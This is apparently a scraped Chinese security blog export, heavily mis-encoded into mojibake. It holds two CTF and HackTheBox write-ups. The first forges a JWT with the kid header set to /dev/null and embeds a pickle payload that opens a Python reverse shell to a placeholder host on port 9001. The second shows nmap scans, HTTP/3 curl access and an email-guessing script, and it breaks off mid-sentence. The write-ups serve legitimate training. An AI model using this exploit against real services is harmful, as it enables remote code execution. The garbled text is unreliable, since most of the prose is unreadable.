ä¸ºèŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚ä½†æ˜¯ä»ç„¶å­¦åˆ°äº†éå¸¸å¤šä¸œè¥¿ï¼Œæ‰€ä»¥ç‰¹åœ°å†™ä¸‹ã€‚èµ›åæˆ‘ä¹Ÿä¸€æ—¶å…´èµ·å†™äº†ç¯‡è‹±æ–‡wpæŠ•CTFTimeä¸Šäº†https://hackmd.io/@byc404/B1VBX8Qp8ä¸‹é¢æˆ‘ç›¸å½“äºè¡¥ä¸€ä»½ä¸­æ–‡wp: é¦–å…ˆæ˜¯é¢˜ç›®æ³¨å†Œï¼Œç™»å½•åçš„token é‡ç‚¹åŒæ ·åœ¨äºjwtçš„header 12345&#123; &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;, &quot;kid&quot;: &quot;secret.txt&quot;&#125; ä»headerä¿¡æ¯ä¸­ã€‚æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºï¼Œjwtçš„keyæ˜¯ä»secret.txtè¿™ä¸ªæ–‡ä»¶ä¸­è·å–çš„ã€‚ ä½†æ˜¯éå¸¸å¥‡æ€ªçš„æ˜¯ï¼Œåœ¨æ²¡æœ‰keyçš„æƒ…å†µä¸‹,jwt.ioè§£å‡ºæ¥çš„payloadå†…å®¹ä¸ºç©ºã€‚ è¿™é‡Œå¯èƒ½å°±éœ€è¦ä¸€ç‚¹çœ¼åŠ›äº†ï¼Œå› ä¸ºè‡ªå·±åšè¿‡å¥½å‡ é“pickleç›¸å…³çš„åºåˆ—åŒ–é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œä¸éš¾ç›´æ¥çœ‹å‡ºï¼Œjwtçš„payloadéƒ¨åˆ†è¢«æ›¿æ¢æˆäº†pickleç”Ÿæˆçš„åºåˆ—åŒ–base64å†…å®¹ã€‚æˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥å•ç‹¬æ‹¿å‡ºè¿™ä¸€æ®µå¥‡æ€ªçš„base64ç”¨xxdçœ‹ èƒ½å¤Ÿæ˜æ˜¾çœ‹åˆ°c_mamin,usernameç­‰å­—æ ·ã€‚è¿™å°±æ˜¯å…¸å‹çš„python opcodeçš„å†…å®¹ æ‰€ä»¥è¿™é‡Œæˆ‘æ˜ç¡®äº†é¢˜ç›®çš„è¦æ±‚ï¼šä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆtoken,åŒ…å«æˆ‘ä»¬æ¶æ„çš„pythonåºåˆ—åŒ–å†…å®¹ï¼Œè¿›è¡ŒRCEã€‚ ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šå‘ç°ï¼Œsecret.txtå†…å®¹æœªçŸ¥ï¼Œè€Œæƒ³è¦è·å–keyå¹¶æ²¡æœ‰å…¶ä»–é€”å¾„ã€‚é‚£ä¹ˆé¦–å…ˆæˆ‘å…ˆå°è¯•Noneç®—æ³•è¯•è¯•å§ã€‚ å°è¯•åå‘ç°åªæ¥å—HS256.çœ‹æ¥é‡ç‚¹æ˜¯ï¼Œå¯»æ‰¾åˆ°ä¸€ä¸ªå¯æ§çš„keyã€‚ æ­¤å¤„çš„kidè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ä½œä¸ºå¯†é’¥ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€å¤§éš¾ç‚¹ã€‚å› ä¸ºæ­¤é¢˜æ˜¯pythonç¯å¢ƒï¼Œå…¶é™æ€æ–‡ä»¶åŸºæœ¬æ²¡æœ‰å¯æ§çš„ã€‚å®ƒçš„htmlæ ¼å¼æ˜¯å…¸å‹çš„ç›´æ¥ä»cdnè·å–cssçš„è€Œhtmlæ–‡ä»¶è™½ç„¶æˆ‘ä»¬èƒ½ç›´æ¥è·å–ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿™å¤§æ¦‚ç‡æ˜¯flaskèµ·çš„webåº”ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°±ç®—èƒ½æŒ‡å®štemplates/index.htmlä½œä¸ºkeyï¼Œhtmlä¸­æ˜¯åŒ…å«æœ‰jinja2çš„æ¨¡æ¿è¯­å¥çš„ï¼Œè¿™ä¸€éƒ¨åˆ†ä»£ç æˆ‘ä»¬ä¹Ÿæ˜¯æ— æ³•æ§åˆ¶çš„ã€‚è¿™é‡Œæ”¾å‡ºæ‰’ä¸‹æ¥çš„html æ‰€ä»¥è¯´ï¼Œé™æ€æ–‡ä»¶è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ã€‚çœ‹æ¥åªèƒ½å°è¯•ç³»ç»Ÿæ–‡ä»¶äº†ã€‚ ä½†è¿™é‡Œæˆ‘æƒ³å¤§éƒ¨åˆ†äººéƒ½æ²¡æƒ³è¿‡ï¼Œlinuxçš„ç³»ç»Ÿæ–‡ä»¶ä¸­æœ‰ä»€ä¹ˆæ˜¯å†…å®¹å¯æ§çš„ï¼Ÿè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ã€‚å¸¸è§å¦‚/etc/passwdï¼Œ/etc/hostsç­‰ç­‰éƒ½æ˜¯æ— æ³•é¢„æµ‹çš„ã€‚è€Œ/proc/selfç­‰ç­‰ä¹Ÿè®¸å­˜åœ¨ç©ºæ–‡ä»¶ä½†æ˜¯ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾ç¡®å®šã€‚æœ‰æ²¡æœ‰ä»€ä¹ˆå†…å®¹æ˜¯ç™¾åˆ†ä¹‹ç™¾èƒ½å¤Ÿç¡®å®šçš„å‘¢ï¼Ÿ æœ‰ã€‚ç­”æ¡ˆå°±æ˜¯/dev/null æˆ‘ä»¬éƒ½çŸ¥é“linuxå°†åƒåœ¾å†…å®¹æ‰”è¿›/dev/nullæ˜¯å¸¸è§æ“ä½œã€‚è€Œæˆ‘ä»¬é€šå¸¸æ˜¯echo log &gt; /dev/null 2&gt;&amp;1æ¥å®Œæˆä¸€æ¬¡æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ç›´æ¥æ“ä½œã€‚/dev/nullèƒ½å¤Ÿä¸¢å¼ƒä¸€åˆ‡å†™å…¥å…¶ä¸­çš„æ•°æ®ã€‚è€Œè¯»å–å®ƒå°†ç«‹å³å¾—åˆ°ä¸€ä¸ªEOFã€‚ æ‰€ä»¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶kidè¯»å–/dev/nullä¸ºkey.æ­¤æ—¶æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç©ºå­—ç¬¦ä¸²ä½œä¸ºHS256çš„secretkeyå°±èƒ½å¾—åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„key. 12345678910import jwtheaders=&#123; \"typ\": \"JWT\", \"alg\": \"HS256\", \"kid\": \"/dev/null\"&#125;payload=&#123;&#125;token=jwt.encode(payload,'',algorithm=\"HS256\",headers=headers).decode('utf-8')print(token) é€šè¿‡ä¸Šé¢çš„è„šæœ¬ï¼Œæˆ‘å‘ç°æ›´æ¢cookieæ—¶å¾—åˆ°çš„æŠ¥é”™å›æ˜¾ä¸å†æ˜¯Invalid Signatureï¼Œè€Œæ˜¯Invalid load keyè¿™å…¶å®æ˜¯ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œå› ä¸ºç»è¿‡æœç´¢åè¿™æ˜¯ä¸€ä¸ªpickleçš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»é€šè¿‡æ ¡éªŒäº†ï¼Œåªè¦å‰©ä¸‹çš„payloadéƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„picklebase64æ•°æ®å³å¯ã€‚ ç„¶è€Œä»”ç»†ä¸€æƒ³å‘ç°é—®é¢˜ä¸å¯¹ã€‚jwtä½œä¸ºjson web tokenï¼Œæœ‰æ•ˆçš„ä¼ è¾“æ•°æ®éƒ½åº”è¯¥æ˜¯jsonæ•°æ®ã€‚ä½†è¿™é‡Œå±…ç„¶ç›´æ¥æŠŠpickleçš„opcodebase64åæ”¾åœ¨äº†payloadéƒ¨åˆ†ã€‚è¿™è®©å½“æ—¶çš„æˆ‘æ— æ³•ç†è§£ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼špayloadçš„åŸå§‹å†…å®¹åœ¨pythonä¸­ä¸æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡pyjwtåº“è¿›è¡Œå¯†æ–‡ç”Ÿæˆã€‚ äºæ˜¯æˆ‘å»æ‰¾èµ„æ–™ã€‚å‘ç°å…¶å®jwtçš„HS256ç­¾åæ˜¯hmac-sha256ç”Ÿæˆçš„ã€‚å…¶ä¸­keyæ˜¯jwtçš„secretkey.dataæ˜¯base64(header).base64(payload)æ•´ä½“ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„šæœ¬æ‰‹åŠ¨æ‹¼æ¥ã€‚ä¸‹é¢ç›´æ¥ç»™å‡ºå®Œæ•´çš„exp 123456789101112131415161718192021222324import pickleimport osimport base64from hashlib import sha256import hmacclass exp(object): def __reduce__(self): s = \"\"\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"VPSIP\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \"\"\" return (os.system, (s,))e = exp()payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode('utf-8')#print(payload)key = \"\".encode('utf-8')data =(\"eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\"+payload).encode('utf-8')#print(data)signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())#print(signature)print(data.decode()+'.'+signature.decode().rstrip('=')) è§£é‡Šå‡ ç‚¹1.payloadéƒ¨åˆ†pickleä¸cPickleéƒ½å¯ä»¥ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯python3ç¯å¢ƒï¼Œè¿˜æ˜¯å¾—ç”¨python3ç”Ÿæˆã€‚ 2.æ³¨æ„æˆ‘ä½¿ç”¨äº†base64.urlsafe_b64encodeè€Œä¸æ˜¯base64encodeã€‚è¿™ç‚¹ä¸Šé¢ä¹Ÿè®²è¿‡äº†ï¼Œjwtä¸­ä¸ä¼šå‡ºç°/å’Œ=è¿™æ ·çš„å­—ç¬¦çš„ã€‚æ¯”èµ›ä¸­æˆ‘å¹¶æ²¡æœ‰å»è¯¦ç»†æŸ¥è¯¢ï¼Œè€Œæ˜¯ç›´æ¥æ‰‹åŠ¨å°†/æ›¿æ¢æˆ_å¹¶å»æ‰=åŒæ ·å¾—åˆ°äº†æœ‰æ•ˆçš„key. 3.è¿™é‡Œç”Ÿæˆpickleçš„payloadæˆ‘ä¹ŸåŒæ ·åšäº†ç‚¹æ‰‹è„šï¼šåœ¨å¼¹shellçš„ä»£ç ååŠ äº†å‡ ä¸ªç©ºæ ¼ã€‚åŸå› åŒä¸Šï¼Œå› ä¸ºpayloadéƒ¨åˆ†åŒæ ·ä¸å…è®¸=è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥å¯ä»¥æ‰‹åŠ¨åŠ ç©ºæ ¼é˜²æ­¢å‡ºç°=. 4.å¼¹shellåªå¯èƒ½ä½¿ç”¨pythonæˆ–bashåå¼¹shell.å› ä¸ºè¿™ä¸ªé¶æœºçœŸçš„å•¥éƒ½æ²¡æœ‰ï¼ˆcurl,wget,ncï¼‰ã€‚å½“ç„¶å¦‚æœæ¸—é€linuxé¶æœºåšå¤šäº†ä¹Ÿèƒ½å‘ç°pythonå¼¹shellçœŸçš„ä¸‡é‡‘æ²¹ã€‚æ²¡æœ‰ç”¨bashçº¯ç²¹æ˜¯å› ä¸ºæå¿˜äº†:( 5.æœ€åwpæ”¾å‡ºæ¥åæœ‰ç½‘å‹è¯´ç›´æ¥ç…§æ¬æˆ‘çš„expæœåŠ¡ç«¯ä¼šæŠ¥é”™module &#39;nt&#39; not foundã€‚æˆ‘è¯•äº†ä¸‹å‘ç°å±…ç„¶çœŸçš„æœ‰è¿™ä¸ªé—®é¢˜ã€‚ä½†æ˜¯æ¯”èµ›æ—¶æˆ‘æ˜¯ç”¨vpsä¸Šçš„python3.5ç”Ÿæˆçš„payload,ç»æµ‹è¯•è¿˜æ˜¯å¯ä»¥æˆåŠŸRCEã€‚è€Œæ¢åˆ°æœ¬æœºä¸Šçš„python3.7å°±å‡ºé”™äº†ã€‚æœ€åå¯¹æ¯”payloadå‘ç°ä¸¤è€…ç”Ÿæˆçš„ç­¾åä¸ä¸€è‡´ï¼Œè¿™é‡Œæˆ‘åªèƒ½æ¨æ–­æ˜¯åŠ å¯†ç®—æ³•çš„é—®é¢˜ã€‚æ¯•ç«Ÿæœ¬æœºä¸Šçš„pycryptoæˆ‘ä¸€ç›´æ²¡å¼„å¥½è¿‡ã€‚ æœ€åæˆåŠŸå¼¹shell. å°ç»“jwtå®‰å…¨çš„ç›¸å…³æ¼æ´æˆ‘è®¤ä¸ºåŸºæœ¬ä¸Šå°±åªæœ‰ä»¥ä¸Šè¿™äº›äº†ã€‚å› ä¸ºå…¶å®å…¶ä»–ç›¸å…³çš„æ´æˆ–å¤šæˆ–å°‘éƒ½ä¸æ­¤ç›¸å…³ã€‚åªè¦æŒæ¡äº†è¿™äº›å¸¸è§å¯åˆ©ç”¨çš„ç‚¹ï¼Œå¹¶ä¸”äº†è§£ä¸€ä¸‹ç®—æ³•çš„æµç¨‹ï¼Œå³ä½¿ç¢°åˆ°æœ€åä¸€é“é¢˜è¿™ç§å˜é€šæ€§æå¼ºçš„ä¹Ÿèƒ½é¡ºç€æ€è·¯èµ°ä¸‹å»","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Quick-ä¸€æ¬¡è‰°éš¾çš„æ¸—é€","slug":"hackthebox-Quick-ä¸€æ¬¡è‰°éš¾çš„æ¸—é€","date":"2020-06-23T08:13:39.000Z","updated":"2021-02-18T05:09:22.348Z","comments":true,"path":"2020/06/23/hackthebox-Quick-ä¸€æ¬¡è‰°éš¾çš„æ¸—é€/","link":"","permalink":"https://www.bycsec.top/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/","excerpt":"å› ä¸ºç°åœ¨è¿˜æ²¡æœ‰æ¥åˆ°ç¡®åˆ‡é€šçŸ¥è¯´æ˜¯å¦è€ƒè¯•,åŸæœ¬æœŸæœ«å¤ä¹ çš„è®¡åˆ’ä¹Ÿè¢«æ‰“ä¹±äº†ã€‚æ—¢ç„¶ç°åœ¨å¤ä¹ è§‰å¾—æœ‰ç‚¹äºï¼Œäºæ˜¯å¹²è„†å»åšåšhacktheboxçš„é¶æœºç®—äº†ï¼Œæ­£å¥½å¥½ä¹…æ²¡å†™wpäº†2333ã€‚ è™½ç„¶æ²¡æ›´æ–°æ–‡ç« ï¼Œä½†æ˜¯å…¶å®è‡ªå·±æ¯å‘¨éƒ½åœ¨è·Ÿç€ippsecçš„è§†é¢‘åšé€€å½¹é¶æœºã€‚å½“ç„¶å…¶å®ä¹Ÿåšäº†5.6å°ç°å½¹çš„ã€‚ä¸è¿‡ä»Šå¤©è¦å†™çš„Quické¶æœºçš„wpæ˜¯è‡ªå·±å¤´ä¸€æ¬¡ç‹¬ç«‹å®Œæˆçš„å›°éš¾éš¾åº¦çš„é¶æœºã€‚çœŸçš„çœŸçš„å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å½•ä¸‹ã€‚ å¦å¤–ç”±äºQuickè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚","text":"å› ä¸ºç°åœ¨è¿˜æ²¡æœ‰æ¥åˆ°ç¡®åˆ‡é€šçŸ¥è¯´æ˜¯å¦è€ƒè¯•,åŸæœ¬æœŸæœ«å¤ä¹ çš„è®¡åˆ’ä¹Ÿè¢«æ‰“ä¹±äº†ã€‚æ—¢ç„¶ç°åœ¨å¤ä¹ è§‰å¾—æœ‰ç‚¹äºï¼Œäºæ˜¯å¹²è„†å»åšåšhacktheboxçš„é¶æœºç®—äº†ï¼Œæ­£å¥½å¥½ä¹…æ²¡å†™wpäº†2333ã€‚ è™½ç„¶æ²¡æ›´æ–°æ–‡ç« ï¼Œä½†æ˜¯å…¶å®è‡ªå·±æ¯å‘¨éƒ½åœ¨è·Ÿç€ippsecçš„è§†é¢‘åšé€€å½¹é¶æœºã€‚å½“ç„¶å…¶å®ä¹Ÿåšäº†5.6å°ç°å½¹çš„ã€‚ä¸è¿‡ä»Šå¤©è¦å†™çš„Quické¶æœºçš„wpæ˜¯è‡ªå·±å¤´ä¸€æ¬¡ç‹¬ç«‹å®Œæˆçš„å›°éš¾éš¾åº¦çš„é¶æœºã€‚çœŸçš„çœŸçš„å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å½•ä¸‹ã€‚ å¦å¤–ç”±äºQuickè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚ é¶æœºip: 10.10.10.186 æ”»å‡»æœº: 10.10.14.40 initial footholdè¿™ä¸€éƒ¨åˆ†çœŸçš„æŒºéº»çƒ¦çš„â€¦â€¦ä¸­é—´æœ‰ç‚¹ç‚¹è„‘æ´çš„æˆåˆ†,ä½†æ€»ä½“è¿˜æ˜¯æ¯”è¾ƒç¬¦åˆçœŸå®ç¯å¢ƒçš„ã€‚ é¦–å…ˆå¿…ç„¶æ˜¯nmapç«¯å£æ‰«æã€‚ 1234567891011121314151617# Nmap 7.80 scan initiated Thu Jun 18 14:43:20 2020 as: nmap -sC -sV -oA nmap/quick 10.10.10.186Nmap scan report for 10.10.10.186Host is up (0.44s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)| 256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_ 256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Quick | Broadband ServicesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Jun 18 14:46:54 2020 -- 1 IP address (1 host up) scanned in 214.65 seconds å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†sshè·Ÿ9001webç«¯å£ã€‚å°è¯•è®¿é—®webé¡µé¢ä¼šå‘ç°ä¸»è¦ä¿¡æ¯æœ‰ å‡ ä¸ªæ ‡å‡ºäº†å§“åè·Ÿå…¬å¸çš„ç•™è¨€ updateå¤„æŒ‡å‘äº†ä¸€ä¸ªç½‘é¡µhttps://portal.quick.htb åŒæ—¶åº•éƒ¨clientså®šå‘åˆ°clients.php ä¼¼ä¹é‡Œé¢çš„å…¬å¸è·Ÿå‰é¢çš„äººåå¤‡æ³¨çš„å…¬å¸æœ‰ç›¸åŒçš„åœ°æ–¹ã€‚ç›®å‰åªèƒ½è¯´å¤§è‡´å¯ä»¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚è®¿é—®login.phpå‘ç°éœ€è¦ç”¨æˆ·åè·Ÿå¯†ç ã€‚ä¸è¿‡ï¼Œæ­¤å¤„çš„ç”¨æˆ·åè¦æ±‚ä¸ºé‚®ç®±ç™»å½•ã€‚å¯†ç åˆ™æ²¡æœ‰ä»€ä¹ˆé€éœ²çš„ä¿¡æ¯ã€‚ webé¡µé¢çš„ä¿¡æ¯æ”¶é›†å®Œäº†ï¼Œå°±åº”è¯¥è¯•è¯•https://portal.quick.htbäº† ç„¶è€Œå¥‡æ€ªçš„æ˜¯,æˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰åŠæ³•è®¿é—®è¿™ä¸ªç½‘é¡µ(åœ¨ä¿®æ”¹äº†/etc/hostsçš„å‰æä¸‹)ã€‚å°è¯•ç›´æ¥curlä¹ŸåŒæ ·æ— æœã€‚è¿™æ—¶ç›´æ¥é™·å…¥åƒµå±€ã€‚ åœ¨é€›äº†ä¸€åœˆhtbçš„è®ºå›åï¼Œå‘ç°å¤§å®¶æåˆ°äº†é‡æ–°buildå·¥å…·è¿™ä¸ªå…³é”®ä¿¡æ¯ã€‚å¹¶ä¸”æåˆ°äº†ï¼Œå¦‚æœè®¿é—®ä¸äº†è¿™ä¸ªé¡µé¢ï¼Œæ˜¯å› ä¸ºæµè§ˆå™¨æ— æ³•ç†è§£æ”¶åˆ°çš„ä¿¡æ¯ã€‚æ‰€ä»¥è®¿é—®ä¸äº†ã€‚å¹¶ä¸”æœ€å¥½å°è¯•å…¶ä»–protocol. åœ¨ç•™æ„åˆ°protocolè¿™ä¸ªå…³é”®è¯åï¼Œæˆ‘å¼€å§‹å°è¯•è·‘ä¸€éudpç«¯å£çš„nmap 12345678# Nmap 7.80 scan initiated Fri Jun 19 20:33:51 2020 as: nmap -sU -oA nmap/quick-udp 10.10.10.186Nmap scan report for portal.quick.htb (10.10.10.186)Host is up (0.43s latency).Not shown: 999 closed portsPORT STATE SERVICE443/udp open|filtered https# Nmap done at Fri Jun 19 20:50:40 2020 -- 1 IP address (1 host up) scanned in 1008.38 seconds åŸæ¥åœ¨udpçš„443ç«¯å£æœ‰httpsæœåŠ¡ã€‚çœ‹æ¥å¤§æ¦‚ç‡å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™äº†ã€‚æ­¤æ—¶æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œä¼šå‘ç°è¿™åº”è¯¥æ˜¯HTTP/3åè®®ã€‚å› ä¸ºHTTP/3çš„ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å°†å¼ƒç”¨TCPåè®®ï¼Œæ”¹ä¸ºä½¿ç”¨åŸºäºUDPåè®®çš„QUICåè®®å®ç°ã€‚å¯ä»¥çœ‹ä¸‹ç»´åŸºè·Ÿè¿™ç¯‡æ–‡ç« ã€‚http3-in-curl http/3åè®®è™½ç„¶æ˜¯æ–°è¶‹åŠ¿ï¼Œä½†æ˜¯ç›®å‰èƒ½å”¯ä¸€æœ‰æ•ˆè¿æ¥çš„å·¥å…·è¿˜æ˜¯åªæœ‰curl.æ‰€ä»¥æˆ‘çŒœæµ‹è®ºå›é‡Œå¤§å®¶æåˆ°çš„å°±æ˜¯é‡æ–°ç¼–è¯‘curlä»¥æ”¯æŒhttp3. ç„¶è€Œè¿™ä¸€æ­¥ååˆ†è€—æ—¶é—´ï¼Œå› ä¸ºå¿…é¡»è¦ä¸‹Quicheé‡æ–°ç¼–è¯‘ï¼Œä¸‹brewæ¥è¿›è¡ŒåŒ…ç®¡ç†â€¦â€¦æ€»ä¹‹æˆ‘è¿brewéƒ½æ²¡ä¸‹å®Œå°±æ”¾å¼ƒäº†è¿™ä¸ªé€‰æ‹©ï¼Œå› ä¸ºå›½å†…å®åœ¨å¤ªæ…¢äº†ï¼Œæ¢äº†gitæºååˆå› ä¸ºå…¶ä»–æºç»§ç»­é¾Ÿé€Ÿä¸‹è½½â€¦è¿™æ—¶æˆ‘åœ¨æœç´¢å†…å®¹ä¸­æ³¨æ„åˆ°dockeræœ‰ç°æˆçš„é•œåƒã€‚äºæ˜¯æœæ–­æ¢dockerè¿›è¡Œcurlã€‚(dockerçš„æœ€å¤§ä»·å€¼å°±æ˜¯ä¸ºæˆ‘ä»¬èŠ‚çœäº†é…ç¯å¢ƒçš„å¤§æŠŠæ—¶é—´)pullä¸€ä¸ªymuski/curl-http3é•œåƒ 1docker run -it --rm ymuski/curl-http3 curl -V æ£€æŸ¥ä¸‹æ”¯æŒhttp3.è¿™æ ·å°±å¯ä»¥ç”¨--http3æ¥è®¿é—®ç½‘å€äº† 1docker run -it --rm ymuski/curl-http3 curl https://10.10.10.186 --http3 å‘ç°å‡ ä¸ªé“¾æ¥ã€‚ä¸€ä¸ªä¸ªè®¿é—®åå‘ç°docsæ–‡æ¡£æœ‰ä¸¤ä¸ªpdfã€‚ 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;&lt;h1&gt;Quick | References&lt;/h1&gt;&lt;ul&gt; &lt;li&gt;&lt;a href=\"docs/QuickStart.pdf\"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"docs/Connectivity.pdf\"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/head&gt;&lt;/html&gt; å¼€å§‹æœæ–­å°è¯•ç›´æ¥-oè¾“å‡ºï¼Œä½†æ˜¯å´æå¿˜äº†ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨çš„dockeræ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„è¾“å‡ºåœ¨é•œåƒé‡Œé¢ã€‚æ‰€ä»¥æˆ‘å¾—æŒ‚è½½ä¸€ä¸ªç›®å½•æ¥è·å–è¾“å‡ºçš„pdf 1docker run -it --rm -v /mnt/curl:/tmp ymuski/curl-http3 curl 10.10.10.186 --http3 -o /tmp/xxx.pdf åœ¨å…¶ä¸­ä¸€ä¸ªpdfä¸­å¾—åˆ°å…³é”®ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯å¯†ç ã€‚ é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å°è¯•ç™»å½•äº†ã€‚è¿™ä¹Ÿæ˜¯èµ·æ‰‹å¼è¿™é‡Œåˆä¸€ä¸ªéš¾ç‚¹ã€‚åŸå…ˆhtbçš„é‚®ç®±åŸºæœ¬ä¸Šéƒ½æ˜¯admin@{boxçš„hostname}.htbè¿™ç§å½¢å¼çš„ã€‚ä½†æ˜¯æ­¤å¤„å¸¸è§„å°è¯•éƒ½ä¸èµ·æ•ˆæœã€‚äºæ˜¯åªèƒ½æ‰‹åŠ¨å†™è„šæœ¬ç»„åˆä¸‹ä¹‹å‰çš„ä¿¡æ¯ã€‚ 123456789101112131415161718192021222324252627282930313233343536list=[]users=['tim','roy','elisa','james','mike','jane','john']postfix=['qconsulting.co.uk','darkwing.com','wink.co.uk','lazycoop.cn','scoobydoo.it','penguincrop.fr']postfix2=['qconsulting.co.uk','darkwing.com','wink.co.uk','lazycoop.com.cn','scoobydoo.co.it','penguincrop.co.fr']postfix3=['qconsulting.htb.uk','darkwing.htb','wink.htb.uk','lazycoop.htb.cn','scoobydoo.htb.it','penguincrop.htb.fr']def quick(): global list for i in users: for j in postfix: list.append(i+'@'+j) return listdef quick2(): global list for i in users: for j in postfix2: list.append(i+'@'+j) return listdef quick3(): global list for i in users: for j in postfix3: list.append(i+'@'+j) return listf=open('creds.txt','w')for email in quick(): f.write(email+'\\n')for email in quick2(): f.write(email+'\\n')for email in quick3(): f.write(email+'\\n')f.close() æœ€åå°è¯•å‡ºç»“æœåæ‰å‘ç°å…¶å®ä¸éœ€è¦è¿‡å¤šå°è¯•çš„ã€‚ä½†æ˜¯é‡ç‚¹(éš¾ç‚¹)å°±åœ¨äºï¼Œå®ƒçš„é‚®ç®±æ ¼å¼éå¸¸ç±»ä¼¼çœŸå®çš„ä¼ä¸šé‚®ç®±ã€‚å‰é¢æˆ‘ä»¬ä¸»é¡µé¢çš„ä¿¡æ¯ç»“åˆèµ·æ¥åï¼Œå…¶å®æ¯ä¸ªäººåå¯¹åº”çš„å…¬å¸ï¼Œå›½å®¶éƒ½æ˜¯ç¡®å®šçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸»è¦æ³¨æ„é‡‡ç”¨äºŒçº§åŸŸåå³å¯ã€‚ä¹Ÿå°±æ˜¯è·Ÿåœ¨å…¬å¸ååçš„.co.fr,.co.itç­‰ç­‰ã€‚ å¾—åˆ°ç”¨æˆ·elisaæˆåŠŸç™»é™†å,æˆ‘ä»¬å°±è¦å‡†å¤‡ç¬¬ä¸‰éƒ¨åˆ†çš„åˆ©ç”¨äº†ã€‚è¿™é‡Œæˆ‘ç›´è§‰çŒœæµ‹åº”è¯¥å¯ä»¥RCE,å› ä¸ºhtbçš„é¶æœºå¦‚æœæ²¡æ³•getshellçš„è¯è¿åé¢çš„ææƒéƒ½åšä¸åˆ°ã€‚å‡ºäºç›´è§‰ä»¥åŠæœ€æ—©çš„ä¿¡æ¯æ”¶é›†ï¼Œæˆ‘è®¤ä¸ºè¿™é‡Œåº”è¯¥æ˜¯ä»headerä¸­æ³„éœ²çš„ä¿¡æ¯ä¸‹æ‰‹ æ³¨æ„åˆ°X-Powered-By: 